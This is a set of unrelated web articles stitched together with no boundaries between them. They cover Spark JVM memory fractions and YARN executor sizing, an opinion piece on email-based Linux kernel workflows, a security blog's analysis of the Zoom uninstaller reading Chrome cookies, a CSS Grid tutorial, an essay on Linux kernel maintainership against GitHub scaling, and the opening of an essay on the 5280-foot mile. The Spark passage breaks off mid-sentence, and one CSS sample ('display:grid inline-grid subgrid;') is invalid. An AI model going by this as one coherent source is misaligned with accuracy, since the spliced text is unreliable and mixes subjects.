<p>By default, Spark starts with 512MB JVM heap. To be on a safe side and avoid OOM error Spark allows to utilize only 90% of the heap, which is controlled by the <em>spark.storage.safetyFraction</em> parameter of Spark. Ok, as you might have heard of Spark as an in-memory tool, Spark allows you to store some data in memory. If you have read my article here <a href="https://0x0fff.com/spark-misconceptions/">https://0x0fff.com/spark-misconceptions/</a>, you should understand that Spark is not really in-memory tool, it just utilizes the memory for its LRU cache (<a href="http://en.wikipedia.org/wiki/Cache_algorithms">http://en.wikipedia.org/wiki/Cache_algorithms</a>). So some amount of memory is reserved for the caching of the data you are processing, and this part is usually 60% of the safe heap, which is controlled by the <em>spark.storage.memoryFraction</em> parameter. So if you want to know how much data you can cache in Spark, you should take the sum of all the heap sizes for all the executors, multiply it by <em>safetyFraction</em> and by <em>storage.memoryFraction</em>, and by default it is 0.9 * 0.6 = 0.54 or 54% of the total heap size you allow Spark to use.</p>
<p>Now a bit more about the shuffle memory. It is calculated as “Heap Size” * <em>spark.shuffle.safetyFraction</em> * <em>spark.shuffle.memoryFraction</em>. Default value for <em>spark.shuffle.safetyFraction</em> is 0.8 or 80%, default value for <em>spark.shuffle.memoryFraction</em> is 0.2 or 20%. So finally you can use up to 0.8*0.2 = 0.16 or 16% of the JVM heap for the shuffle. But how does Spark uses this memory? You can get more details on this here (<a href="https://github.com/apache/spark/blob/branch-1.3/core/src/main/scala/org/apache/spark/shuffle/ShuffleMemoryManager.scala">https://github.com/apache/spark/blob/branch-1.3/core/src/main/scala/org/apache/spark/shuffle/ShuffleMemoryManager.scala</a>), but in general Spark uses this memory for the exact task it is called after – for Shuffle. When the shuffle is performed, sometimes you as well need to sort the data. When you sort the data, you usually need a buffer to store the sorted data (remember, you cannot modify the data in the LRU cache in place as it is there to be reused later). So it needs some amount of RAM to store the sorted chunks of data. What happens if you don’t have enough memory to sort the data? There is a wide range of algorithms usually referenced as “external sorting” (<a href="http://en.wikipedia.org/wiki/External_sorting">http://en.wikipedia.org/wiki/External_sorting</a>) that allows you to sort the data chunk-by-chunk and then merge the final result together.</p>
<p>The last part of RAM I haven’t yet cover is “unroll” memory. The amount of RAM that is allowed to be utilized by unroll process is <em>spark.storage.unrollFraction</em> * <em>spark.storage.memoryFraction</em> * <em>spark.storage.safetyFraction</em>, which with the default values equal to 0.2 * 0.6 * 0.9 = 0.108 or 10.8% of the heap. This is the memory that can be used when you are unrolling the block of data into the memory. Why do you need to unroll it after all? Spark allows you to store the data both in serialized and deserialized form. The data in serialized form cannot be used directly, so you have to unroll it before using, so this is the RAM that is used for unrolling. It is shared with the storage RAM, which means that if you need some memory to unroll the data, this might cause dropping some of the partitions stored in the Spark LRU cache.</p>
<p>This is great, because at the moment you know what exactly Spark process is and how it utilizes the memory of its JVM processes. Now let’s switch to the cluster mode – when you start a Spark cluster, how does it really look like? I like YARN so I would cover how it works in YARN, but in general it is the same for any cluster manager you use:</p>
<p><a href="https://i2.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN.png"><img src="https://i0.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN-1024x826.png?resize=625%2C504" alt="Spark Architecture On YARN" width="625" height="504" srcset="https://i2.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN.png?resize=1024%2C826&amp;ssl=1 1024w, https://i2.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN.png?resize=300%2C242&amp;ssl=1 300w, https://i2.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN.png?resize=624%2C503&amp;ssl=1 624w, https://i2.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN.png?w=1816&amp;ssl=1 1816w, https://i2.wp.com/0x0fff.com/wp-content/uploads/2015/03/Spark-Architecture-On-YARN.png?w=1250&amp;ssl=1 1250w" sizes="(max-width: 625px) 100vw, 625px" data-recalc-dims="1"></a></p>
<p>When you have a YARN cluster, it has a YARN Resource Manager daemon that controls the cluster resources (practically memory) and a series of YARN Node Managers running on the cluster nodes and controlling node resource utilization. From the YARN standpoint, each node represents a pool of RAM that you have a control over. When you request some resources from YARN Resource Manager, it gives you information of which Node Managers you can contact to bring up the execution containers for you. Each execution container is a JVM with requested heap size. JVM locations are chosen by the YARN Resource Manager and you have no control over it – if the node has 64GB of RAM controlled by YARN (<em>yarn.nodemanager.resource.memory-mb</em> setting in yarn-site.xml) and you request 10 executors with 4GB each, all of them can be easily started on a single YARN node even if you have a big cluster.</p>
<p>When you start Spark cluster on top of YARN, you specify the amount of executors you need (<em>–num-executors</em> flag or <em>spark.executor.instances</em> parameter), amount of memory to be used for each of the executors (<em>–executor-memory</em> flag or <em>spark.executor.memory </em>&nbsp;parameter), amount of cores allowed to use for each executors (<em>–executor-cores</em> flag of <em>spark.executor.cores</em> parameter), and amount of cores dedicated for each task’s execution (<em>spark.task.cpus</em> parameter). Also you specify the amount of memory to be used by the driver application (<em>–driver-memory</em> flag or <em>spark.driver.memory</em> parameter).</p>
<p>When you execute something on a cluster, the processing of your job is split up into stages, and each stage is split into tasks. Each task is scheduled separately. You can consider each of the JVMs working as executors as a pool of task execution slots, each executor would give you <em>spark.executor.cores</em> / <em>spark.task.cpus</em> execution slots for your tasks, with a total of <em>spark.executor.instances</em> executors. Here’s&nbsp;an example. The cluster with 12 nodes running YARN Node Managers, 64GB of RAM each and 32 CPU cores each (16 physical cores with hyper threading). This way on each node you can start 2 executors with 26GB of RAM each (leave some RAM for system processes, YARN NM and DataNode), each executor with 12 cores to be utilized for tasks (leave some cores for system processes, YARN NM and DataNode). So In total your cluster would handle 12 machines * 2 executors per machine * 12 cores per executor / 1 core for each task = 288 task slots. This means that your Spark cluster would be able to run up to 288 tasks in parallel thus utilizing almost all the resources you have on this cluster. The amount of RAM you can use for caching your data on this cluster is 0.9 <em>spark.storage.safetyFraction&nbsp;</em>* 0.6 <em>spark.storage.memoryFraction&nbsp;</em>* 12 machines * 2 executors per machine * 26 GB per executor = 336.96 GB. Not that much, but in most cases it is enough.</p>
<p>So far so good, now you know how the Spark uses its JVM’s memory and what are the execution slots you have on your cluster. As you might already noticed, I didn’t stop in details on what the “task” really is. This would be a subject of the next article, but basically it is a single unit of work performed by Spark, and is executed as a <strong><em>thread</em></strong> in the executor JVM. This is the secret under the Spark low job startup time – forking additional thread inside of the JVM is much faster that bringing up the whole JVM, which is performed when you start a MapReduce job in Hadoop.</p>
<p>Now let’s focus on another Spark abstraction called “<em><strong>partition</strong></em>”. All the data you work with in Spark is split into partitions. What a single partition is and how is it determined? Partition size completely depends on the data source you use. For most of the methods to read the data in Spark you can specify the amount of partitions you want to have in your RDD. When you read a file from HDFS, you use Hadoop’s InputFormat to make it. By default each input split returned by InputFormat is mapped to a single partition in RDD. For most of the files on HDFS single input split is generated for a single block of data stored on HDFS, which equals to approximately 64MB of 128MB of data. Approximately, because the data in HDFS is split on exact block boundaries in bytes, but when it is processed it is split on the record splits. For text file the splitting character is the newline char, for sequence file it is the block end and so on. The only exception of this rule is compressed files – if you have the whole text file compressed, then it cannot be split into records and the whole file would become a single input split and thus a single partition in …</p></div></div>

<p>The amount of folks who are up in arms about <a href="https://www.theregister.com/2020/08/25/linux_kernel_email/" rel="noopener" target="_blank">Sarah Novotny's views on email based workflows in Linux</a> put a smirk on my face today, but I figured I would post my own opinions, having both spent way too many hours with mutt, offlineimap, postfix, and so on. I even wrote an entire article series on this for Ars Technica that is so old I can't even find it on the web any more. And Lee Hutchinson's <a href="https://arstechnica.com/information-technology/2014/02/how-to-run-your-own-e-mail-server-with-your-own-domain-part-1/" rel="noopener" target="_blank">version is from 2014</a>! </p>

<p>How can someone who is wanting to contribute to the kernel possibly not know how to send a plain text email? If you can't do that then you have no business in the kernel right?</p>

<p>It's not a matter of can't, it's a matter of won't. There's a reason no one writes their resumes in LaTeX either.  Sure, I can do it. I figured it out, achievement unlocked. </p>

<p>You would be shocked at the amount of <em>core contributors to Kubernetes</em> that we routinely find aren't subscribed to the main mailing list. Sending git formatted patches over email, are you kidding? Most of my open source collaborators aren't even  <em>reading</em> their emails lol. </p>

<p>You don't send a mail to the list to propose something, you <a href="https://github.com/kubernetes/enhancements/tree/master/keps" rel="noopener" target="_blank">write an enhancement proposal</a> and if you're nice, you might mention it on a list, but all that activity happens in GitHub. And if you want a meaty discussion you hop onto Zoom and discuss it high bandwidth style with your SIG before moving on. You're not going to find lengthy discussions about technical features on many of our mailing lists, you'll find them in the GitHub issues, PR comments, and meeting transcripts. </p>

<ul>
<li>VMware (my employer) has incredible Kubernetes and cloud native content: <a href="https://tgik.io/" rel="noopener" target="_blank">TGIK</a>  is all on YouTube. </li>
<li>It's not a coincidence that <a href="https://www.openshift.com/streaming" rel="noopener" target="_blank">OpenShift streams on twitch</a> </li>
</ul>

<p>No fair you say! There's a difference between using/consuming technical content and coordinating/running an entire project. That's the point, not any more! </p>

<p>Watch how Martin Wimpress <a href="https://www.youtube.com/watch?v=4ICRjjjMbEE" rel="noopener" target="_blank">does a live package update in Ubuntu MATE</a>. That level of interaction with the audience isn't just the future of OSS development, it's the present. Our next kernel people, Debian maintainers, library maintainers, and everything inbetween are sitting in places like this and this is how they interact with themselves and their communities. There's just too much awesome shit in the world for people to slow down to figure out emails and mailman. And if you think this is just about email, wait until you see how much coordination and awesome stuff is happening in Discord. Yep, this is about IRC too, all of it. </p>

<p>I hear ya, I wish plaintext wasn't on the way out as a workflow, but at the end of the day, most projects aren't Linux. You can't afford an email mailing list workflow, you need to be where the developers are. New developers coming into the field are as likely to be on AOL than setting up mutt, that's just how it ended up. The distribution developers know how to do this, it's part of their job, but let's not kid ourselves,  the eyeballs are not on mailing lists.</p>

<p>Linux is missing an entire generation of new talent due to this. I don't sweat it, Linux is fundamental technology, it'll survive just fine, but it'll continue to be a workflow that won't jive with a number of people coming into the field. </p>

<p>Also it's pretty evident from most Microsoft conspiracy comments that no one bothered to look up Sarah's OSS credentials, but of course, that didn't surprise you either. Her points still stand if you replace GitHub with GitLab, or whatever tool you prefer. </p>

            <section>
              <div>


<p>Your average user takes it for granted that websites know when you've visited before, whether you were logged in and even what you had in your basket last time you shopped. In most cases this magic customisation is possible through the use of Cookies.  Cookies are small pieces of information that are stored on devices by websites in order to identify users - this allows websites to customise the content they deliver to each person.</p>

<p>Although some functionality afforded by cookies can be helpful in increasing the security and accessibility of websites, there have long been privacy concerns with companies being able to track you across the Internet. Many concerns are related to the use of tracking and advertising cookies, and how companies use and abuse this data to manipulate customers. Since the introduction of the ePrivacy Directive and the GDPR, cookies have received a lot of attention in discussions about online privacy.</p>

<p>During the last month, Threatspike EDR detected the widely used Zoom Windows client accessing the Google Chrome cookie file during the uninstall process. </p>

<p><img src="https://www.threatspike.com/blog/blog_files/cookies_alert.png"></p><p>This was flagged as suspicious behaviour and we decided to get to the bottom of why this access was taking place and whether there was any malicious intent.</p>

<p>We carried out the following steps:</p>

<ul>
  <li>started with a clear Cookie file;</li>
<li>downloaded the Zoom application;</li>
<li>accessed the zoom.us website; </li>
<li>accessed several websites, including uncommon ones;</li>
<li>saved a list of cookies;</li>
<li>uninstalled Zoom; and</li>
<li>saved a new list of cookies to identify changes made by Zoom.</li> 
</ul>

<p>Zoom cookies are firstly written when the user connects to the website zoom.us and accepts the cookies options. Some extra cookies are added when the user logs in to the website.</p>

<p><img src="https://www.threatspike.com/blog/blog_files/first_cookies.png"></p><p>This behaviour is generally expected. The surprising thing comes when a user tries to uninstall the Zoom client from a Windows machine. The file install.exe is seen accessing the user's Chrome Cookies file and reading parts of the file that do not contain Zoom related information.</p>

<p><img src="https://www.threatspike.com/blog/blog_files/procmon1.png"></p><p>We decided to look closer at the read operations performed during the uninstall process. The question we wanted to answer was: is Zoom purposely and selectively accessing cookies from other websites?</p>

<p>The above mentioned procedure was repeated with files containing different amounts of cookies and belonging to different websites. The reason for accessing unrelated websites (such as the Hackney council, an Italian supermarket and a famous popstar fan page) is that it is unlikely Zoom would want to selectively store the information contained in these cookies. From our tests we found that the cookie files were accessed through the same pattern where cookies were read in a non selective manner. We, therefore, concluded that the behaviour observed in the above image could be attributed to a binary tree search to find the Zoom cookie, rather than Zoom looking to access (and possibly steal) other cookies.</p> 

<p>Throughout the process the following cookies were left on the user's system:</p>

<p><img src="https://www.threatspike.com/blog/blog_files/cookies_after_install.png"></p><p>The cookies with no expiration date (also known as session cookies) will be removed from the cookie history when the browser is closed. On the other hand, NPS_0487a3ac_throttle, NPS_0487a3ac_last_seen, _zm_kms and _zm_everlogin_type do have expiry dates. In particular, the latter has a duration set to 10 years.</p>

<p><img src="https://www.threatspike.com/blog/blog_files/ever_login.png"></p><p>Based on the name of this cookie “everlogin” it is assumed that this stores information about whether the user has ever logged into Zoom. The fact that a process would store this information after the application is uninstalled (i.e. when the user has decided not to use it any more) is clearly not in compliance with the ePrivacy Directive:</p>

<p><em>All persistent cookies have an expiration date written into their code, but their duration can vary. According to the ePrivacy Directive, they should not last longer than 12 months, but in practice, they could remain on your device much longer if you do not take action.</em></p>

<p>Keeping track of users activity on the internet is not bad in itself. However, the average users will not dig much deeper into the meaning of the “Accept all cookies” button they see so often. It is, therefore, companies’ responsibility to respect what is recommended by pieces of legislation such as the ePrivacy Directive and the GDPR and ensure that everyone has a fair experience on the Internet.</p>

<p>Findings like this one make you question the integrity of widely used online services in the protection of user’s data and their privacy.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The introduction of CSS grid was a breakthrough for webpage layout, it was a new and easy way to place elements on a webpage where ever you'd want. </p>
<p>CSS Grid is a powerful property because sides letting us easily layout a webpage, it also helps with responsive web design, allowing our webpage look good on various screen sizes.</p>
<p>By the end of this article, you would be able to layout a webpage with CSS Grid effectively, using different Grid properties.</p>
<h2 id="what-is-css-grid">What is CSS Grid?</h2>
<p>CSS Grid is a two-dimensional layout system, which means it works with rows and columns that is used to position elements on a webpage.</p>
<p>CSS Grid is activated by setting the display property of a parent element to <strong>grid</strong>, <strong>inline-grid</strong>, or <strong>subgrid</strong>.</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid inline-grid subgrid;
}
</code></pre><h2 id="grid-properties">Grid Properties</h2>
<p>We're going to be looking at two property groups, namely: 
<strong>Properties for the Parent Elements(Grid Container) and Properties for the Children Elements(Grid Items).</strong></p>
<p>In this article, we're going to be focusing on some properties from each property group, that's going to help you create beautiful and responsive page layouts.</p>
<h2 id="parent-elementsgrid-container-properties">Parent Elements(Grid Container) Properties</h2>
<ul>
<li>Display</li>
<li>Grid-template-columns (repeat, auto-fill and minmax)</li>
<li>Grid-template-rows</li>
<li>Gap</li>
</ul>
<h2 id="display">Display</h2>
<p>By setting a parent element's display property to <strong>grid</strong>, you have activated the CSS Grid system. let's look at the example below ;</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid;
}
</code></pre><h2 id="grid-template-columns">Grid-template-columns</h2>
<p>This grid property is used to define the columns of a grid system, think of this as the width of the element. The values can be lengths, percentages, or fractions. In this article, we're going to be using fractions.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>1</span>fr <span>1</span>fr <span>1</span>fr;
}
</code></pre>
<p>Let's analyze our code. We set the display property of the container to <strong>Grid</strong> which activates the CSS grid layout system and the <strong>grid-template-columns</strong> to <strong>1fr</strong>.</p>
<p>Notice how we put in <strong>1fr</strong> thrice? Well, that simply means, take a third of the container 3 times, so 1/3. Let's look at the code below;</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid;
    <span>grid-template-columns</span>: <span>1</span>fr <span>1</span>fr <span>2</span>fr;
}
</code></pre><p>In the example above, <strong>2fr</strong> is going to take twice the size of <strong>1fr</strong> whilst <strong>1fr</strong> reduces in size so that when the new size of <strong>1fr</strong> is added it gives the exact amount of the size left by <strong>2fr</strong> and they can all fit into the container. </p>
<p>Another way to set the values for the <strong>grid-template-columns</strong> is to use the <strong>repeat()</strong> value. Let's look at how this works below;</p>
<pre><code><span>.container</span>{
    <span>display</span>:grid;
    <span>grid-template-columns</span>: <span>repeat</span>(<span>3</span>, <span>1</span>fr);
}
</code></pre><p>The above code would produce the same result, it's just a faster way to set the values. The first value specifies how many times you want to repeat and the second set the value you want to repeat.</p>
<blockquote>
<p><strong>NOTE:</strong> The fraction unit is more advisable to use when working with the grid system because it takes into account other factors like the gap between the elements in the container and then adjusts so that it can fit in properly; we'll get a better understanding of this when we get to the gap property. </p>
</blockquote>
<h2 id="grid-template-rows">Grid-template-rows</h2>
<p>The <strong>grid-template-rows</strong> property is used to define the rows of a grid system, think of this as the height of the element. The values can be lengths, percentages, or fractions.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>3</span>, <span>1</span>fr);
  <span>grid-template-rows</span>: <span>1</span>fr <span>2</span>fr;
}
</code></pre>
<h2 id="gap">Gap</h2>
<p>The <strong>gap</strong> property is used to set the space between items on a grid system, think of this as setting the margin-top, left, bottom, and right property of the item.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>3</span>, <span>1</span>fr);
  <span>grid-template-rows</span>: <span>1</span>fr <span>2</span>fr;
  <span>gap</span>: <span>10px</span>;
}
</code></pre>
<h2 id="bonus">Bonus</h2>
<p>Let's look at a common code pattern that is going to help our grid system be a lot more responsive.</p>
<pre><code><span>.container</span>{
  <span>display</span>:grid;
  <span>grid-template-columns</span>: <span>repeat</span>(auto-fill, <span>minmax</span>(<span>200px</span>, <span>1</span>fr));
  <span>grid-template-rows</span>: <span>1</span>fr <span>2</span>fr;
  <span>gap</span>: <span>10px</span>;
}
</code></pre>
<p>In the code above, we set the <strong>auto-fill</strong> value and this means the grid items would auto-fill according to the size of the viewport to fill up whatever space is left. Then we set the <strong>minmax</strong> value which specifies the minimum size of the column which is <strong>200px</strong> and the maximum to be <strong>1fr</strong></p>
<h2 id="children-elementsgrid-items-properties">Children Elements(Grid Items) Properties</h2>
<ul>
<li>grid-column</li>
<li>grid-row</li>
</ul>
<h2 id="grid-column">Grid-column</h2>
<p><strong>Grid-column</strong> is a grid item property that specifies the position of an item in a grid system on the column axis. <strong>Grid-column</strong> is a short-hand property used for specifying the <strong>grid-column-start</strong> and <strong>grid-column-end</strong> property of an item.</p>
<pre><code>.item {


    grid-column: 1 / 4 ;



   grid-column-start: 1;
   grid-column-end: 3;   
}
</code></pre>
<p>Now let's do a quick analysis of what is going on in this example so that we can have a better understanding.</p>
<p><img src="https://i.imgur.com/C6E2DI6.png" alt=""></p>
<p>When we create a grid system, there are invisible grid lines that are created that we don't see, well technically they are not invisible when you use the chrome developer tools.</p>
<p>In our example,  we set the <strong>grid-column-start</strong> of the items with the <strong>.green</strong> class to <strong>1</strong>. Now notice the green class in the image, it starts at <strong>1</strong> where the first column begins continues to <strong>2</strong> where the second column begins and then <strong>ends</strong> at <strong>3</strong></p>
<h2 id="grid-row">Grid-row</h2>
<p><strong>Grid-row</strong> is a grid item property that determines how an item in a grid system is positioned on the row axis. <strong>Grid-row</strong> is a short-hand property used for specifying the <strong>grid-row-start</strong> and <strong>grid-row-end</strong> property of an item.</p>
<pre><code>.item {


    grid-row: 1 / 4 ;



   grid-row-start: 1;
   grid-row-end: 3;   
}
</code></pre>
<p><img src="https://i.imgur.com/hRZyBIJ.png" alt=""></p>
<p>The above example follows the same principle as the <strong>grid-column</strong>, but this only affects the row axis.</p>
<h2 id="conclusion">Conclusion</h2>
<blockquote>
<p>"On October 17th, Microsoft’s Edge browser shipped its implementation of CSS Grid. This is a milestone for several reasons. First, it means that all major browsers now support this incredible layout tool. Second, it means that all major browsers rolled out their implementations in a single year(!), a terrific example of standards success and cross-browser collaboration. But third, and perhaps most interestingly, it closes the loop on a process that has been more than 20 years in the making. ~<a target="_blank" href="https://alistapart.com/article/the-story-of-css-grid-from-its-creators/">A LIST APART</a>"</p>
</blockquote>
<p>CSS Grid makes a great, easy, and responsive way to layout a webpage, by specifying simple properties we can make our webpage look beautiful and organized.</p>
<p>This brings me to the end of this article. In this part of the series, we looked at how to layout a webpage, by using the CSS Grid system. In the coming parts of the series, we're going to be looking at other ways we could layout and position elements on a webpage.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>A while back at the awesome <a href="https://maintainerati.org/">maintainerati</a> I
chatted with a few great fellow maintainers about how to scale really big open
source projects, and how github forces projects into a certain way of scaling.
The linux kernel has an entirely different model, which maintainers hosting
their projects on github don’t understand, and I think it’s worth explaining why
and how it works, and how it’s different.</p>

<p>Another motivation to finally get around to typing this all up is the <a href="https://news.ycombinator.com/item?id=13444560">HN
discussion</a> on my <a href="https://blog.ffwll.ch/2017/01/maintainers-dont-scale.html">“Maintainers
Don’t Scale” talk</a>, where the top comment
boils down to “… why don’t these dinosaurs use modern dev tooling?”. 
A few top kernel maintainers vigorously defend mailing lists and patch
submissions over something like github pull requests, but at least some folks from
the graphics subsystem would love more modern tooling which would be much easier
to script. The problem is that
github doesn’t support the way the linux kernel scales out to a huge number of
contributors, and therefore we can’t simply move, not even just a few
subsystems. And this isn’t about just hosting the git data, that part obviously
works, but how pull requests, issues and forks work on github.</p>

<!--more-->

<h2 id="scaling-the-github-way">Scaling, the Github Way</h2>

<p>Git is awesome, because everyone can fork and create branches and hack on the
code
very easily. And eventually you have something good, and you create a pull
request for the main repo and get it reviewed, tested and merged. And github is
awesome, because it figured out an UI that makes this complex stuff all nice&amp;easy
to discover and learn about, and so makes it a lot simpler for new folks to
contribute to a project.</p>

<p>But eventually a project becomes a massive success, and no amount of tagging,
labelling, sorting, bot-herding and automating will be able to keep on top of
all the pull requests and issues in a repository, and it’s time to split things
up into more manageable pieces again. More important, with a certain size and
age of a project different parts need different rules and processes: The shiny
new experimental library has different stability and CI criteria than the main
code, and maybe you have some dumpster pile of deprecated plugins that aren’t
support, but you can’t yet delete them: You need to split up your
humongous project into sub-projects, each with their own flavour of process and
merge criteria and their own repo with their own pull request and issue tracking.
Generally it takes a few tens to few hundreds of full time contributors until
the pain is big enough that such a huge reorganization is necessary.</p>

<p>Almost all projects hosted on github do this by splitting up their monorepo
source tree into lots of different projects, each with its distinct set of
functionality. Usually that results in a bunch of things that are considered the
core, plus piles of plugins and libraries and extensions. All tied together with
some kind of plugin or package manager, which in some cases directly fetches
stuff from github repos.</p>

<p>Since almost every big project works like this I don’t think it’s necessary to
delve on the benefits. But I’d like to highlight some of the issues this is
causing:</p>

<ul>
  <li>
    <p>Your community fragments more than necessary. Most contributors just have the
code and repos around that they directly contribute to, and ignore everything
else. That’s great for them, but makes it much less likely that duplicated
effort and parallel solutions between different plugins and libraries get
noticed and the efforts shared. And people who want to steward the overall
community need to deal with the hassle of tons of repos either managed through
some script, or git submodules, or something worse, plus they get drowned in
pull requests and issues by being subscribed to everything. Any kind of
concern (maybe you have shared build tooling, or documentation, or whatever)
that doesn’t neatly align with your repo splits but cuts across the project
becomes painful for the maintainers responsible for that.</p>
  </li>
  <li>
    <p>Even once you’ve noticed the need for it, refactoring and code sharing have
more bureaucratic hurdles: First you have to release a new version of the core
library, then go through all the plugins and update them, and then maybe you
can remove the old code in the shared library.  But since everything is
massively spread around you can forget about that last step.</p>

    <p>Of course it’s not much work to do this, and many projects excel at making
this fairly easy. But it is more effort than a simple pull request to the one
single monorepo. Very simple refactorings (like just sharing a single new
function) will happen less often, and over a long time that compounds and
accumulates a lot of debt. Except when you go the node.js way with repos for
single functions, but then you essentially replace git with npm as your source
control system, and that seems somewhat silly too.</p>
  </li>
  <li>
    <p>The combinatorial explosion of theoretically supported version mixes becomes
unsupportable. As a user that means you end up having to do the integration
testing. As a project you’ll end up with blessed combinations, or at least
de-facto blessed combinations because developers just close bug reports with
“please upgrade everything first”. Again that means defacto you have a
monorepo, except once more it’s not managed in git. Well, except if you use
submodules, and I’m not sure that’s considered git …</p>
  </li>
  <li>
    <p>Reorganizing how you split the overall projects into sub-projects is a pain,
since it means you need to reorganize your git repositories and how they’re
split up. In a monorepo shifting around maintainership just amounts to
updating OWNER or MAINTAINERS files, and if your bots are all good the new
maintainers get auto-tagged automatically. But if your way of scaling means
splitting git repos into disjoint sets, then any reorg is as painful as the
initial step from a monorepo to a group of split up repositories. That means
your project will be stuck with a bad organizational structure for too long.</p>
  </li>
</ul>

<h2 id="interlude-why-pull-requests-exist">Interlude: Why Pull Requests Exist</h2>

<p>The linux kernel is one of the few projects I’m aware of which isn’t split up
like this. Before we look at how that works - the kernel is a huge project and
simply can’t be run without some sub-project structure - I think it’s
interesting to look at why git does pull requests: On github pull request is the
one true way for contributors to get their changes merged. But in the kernel
changes are submitted as patches sent to mailing lists, even long after git has
been widely adopted.</p>

<p>But the very first version of git supported pull requests. The audience of these
first, rather rough, releases was kernel maintainers, git was
written to solve Linus Torvalds’ maintainer problems. Clearly it was needed and
useful, but not to handle changes from individual contributors: Even today, and
much more back then, pull requests are used to forward the changes of an entire
subsystem, or synchronize code refactoring or similar cross-cutting change
across different sub-projects. As an example, the <a href="https://lkml.org/lkml/2017/5/2/508">4.12 network pull request
from Dave S. Miller</a>, <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8d65b08debc7e62b2c6032d7fe7389d895b92cbc">committed by
Linus</a>:
It contains 2k+ commits from 600 contributors and a bunch of merges for pull
requests from subordinate maintainers. But almost all the patches themselves are
committed by maintainers after picking up the patches from mailing lists, not by
the authors themselves. This kernel process peculiarity that authors generally
don’t commit into shared repositories is also why git tracks the committer and
author separately.</p>

<p>Github’s innovation and improvement was then to use pull requests for
everything, down to individual contributions. But that wasn’t what they were
originally created for.</p>

<h2 id="scaling-the-linux-kernel-way">Scaling, the Linux Kernel Way</h2>

<p>At first glance the kernel looks like a monorepo, with everything smashed into
one place in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/">Linus’ main
repo</a>. But that’s very far from it:</p>

<ul>
  <li>
    <p>Almost no one who’s using linux is running the main repo from Linus Torvalds.
If they run something upstream-ish it’s probably one of the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux-stable.git/">stable
kernels</a>.
But much more likely is that they run a kernel from their distro, which
usually has additional patches and backports, and isn’t even hosted on
<a href="https://git.kernel.org/">kernel.org</a>, so would be a completely different
organization. Or they have a kernel from their hardware vendor (for SoC and
pretty much anything Android), which often have considerable deltas compared
to anything hosted in one of the “main” repositories.</p>
  </li>
  <li>
    <p>No one (except Linus himself) is developing stuff on top of Linus’ repository.
Every subsystem, and often even big drivers, have their own git repositories,
with their own mailing lists to track submissions and discuss issues
completely separate from everyone else.</p>
  </li>
  <li>
    <p>Cross-subsystem work is done on top of the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/">linux-next integration
tree</a>,
which contains a few hundred git branches from about as many different git
repositories.</p>
  </li>
  <li>
    <p>All this madness is managed through the
<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/MAINTAINERS">MAINTAINERS</a>
file and the get_maintainers.pl script, which for any given snippet of code can
tell you who’s the maintainer, who should review this, where the right git
repo is, which mailing lists to use and how and where to report bugs. And it’s
not just strictly based on file locations, it also catches code patterns to
make sure that cross-subsystem topics like device-tree handling, or the
kobject hierarchy are handled by the right experts.</p>
  </li>
</ul>

<p>At first this just looks like a complicated way to fill everyone’s disk space
with lots of stuff they don’t care about, but there’s a pile of compounding
minor benefits that add up:</p>

<ul>
  <li>
    <p>It’s dead easy to reorganize how you split things into sub-project, just
update the MAINTAINERS file and you’re done. It’s a bit more work than it
really needs to be, since you might need to create a new repo, new mailing
lists and a new bugzilla. That’s just an UI problem that github solved with
this neat little <em>fork</em> button.</p>
  </li>
  <li>
    <p>It’s really really easy to reassign discussions on pull requests and issues
between sub-projects, you simply adjust the Cc: list on your reply.</p></li></ul></article></div>

									♦ <a href="https://petersmagnusson.org/2009/09/15/why-are-there-5280-feet-in-a-mile/#comments">10 Comments</a>							</p>

			<p>The original Roman mile was 1000 paces (<em>milia passuum</em>), or 5000 feet. The modern mile was defined as 5280 feet under Queen Elizabeth at the end of the 16th century in order to reconcile multiple discordant measurement systems already in wide use. In particular, it was convenient to make it an even multiple of the sides of an acre, which since early medieval times was a rectangle 660 feet long and 66 feet wide. 660 divides neatly into 5280, eight ways, allowing a square mile (640 acres or a “section”) to be conveniently quartered three times over: into quarter sections (160 acres), sixteenth sections (40 acres), and finally the 10 acre squares (660 by 660 feet) that remain at the base of all US land surveys to this day.</p>

<p><em>Background: Many years ago, I became curious as to why, exactly, there are 5280 feet in a mile. The explanations I found online at the time weren’t very convincing. At the time I tried to make some fixes to parts of the puzzle in Wikipedia, but they frequently rejected as OR (original research). Eventually I wrote this article, since revised and updated several times. Since then, my “version” of things will occasionally drift to the #1 spot on Google or Bing, or both, when answering the specific question “why are there 5280 feet in a mile”. More often some SEO-optimized version will slip ahead, though it seems this article is holding steady in the top 3 or 4 at least. So hopefully pretty much everybody who cares about the details will find this. If you have any comments or questions (or corrections), please add to the comment section, I do (eventually) read all comments.<br>
</em></p>
<p><em>I have yet to find an answer to the question that’s as thorough and complete as this one is. But I must caution that this article isn’t really up to academic standards and contains a non-trivial amount of speculation. Caveat Emptor, what follows is my theory of how the mile ended up with 5280 feet.</em></p>
<p>The conventional wisdom on this topic goes something like this: the mile was originally 5000 feet. It was changed to 5280 feet in Elizabethan times around the year 1600 (some point to 1592 and some to 1593) to accommodate the furlong, which was 660 feet. It was easier to fix the mile rather than the furlong for various reasons, hence, eight furlongs and 5280 feet in a mile.</p>
